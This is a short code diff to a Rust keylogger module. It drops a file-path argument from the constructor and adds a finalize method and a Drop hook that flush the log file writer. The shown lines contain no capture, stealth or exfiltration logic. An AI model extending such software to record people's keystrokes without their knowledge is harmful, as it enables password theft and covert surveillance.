@@ -13,10 +13,10 @@ pub struct KeyLogger {
 }
 
 impl KeyLogger {
-    pub fn new(file_path: &str) -> Result<Self, std::io::Error> {
+    pub fn new() -> Result<Self, std::io::Error> {
         let device_state = DeviceState::new();
         let key_processor = KeyProcessor::new();
-        let file_writer = FileWriter::new(file_path)?;
+        let file_writer = FileWriter::new()?;
 
         Ok(Self {
             device_state,
@@ -32,5 +32,15 @@ impl KeyLogger {
 
     pub fn should_exit(&self) -> bool {
         self.key_processor.should_exit()
+    }
+
+    pub fn finalize(&mut self) -> Result<(), std::io::Error> {
+        self.file_writer.finalize()
+    }
+}
+
+impl Drop for KeyLogger {
+    fn drop(&mut self) {
+        let _ = self.finalize();
     }
 }
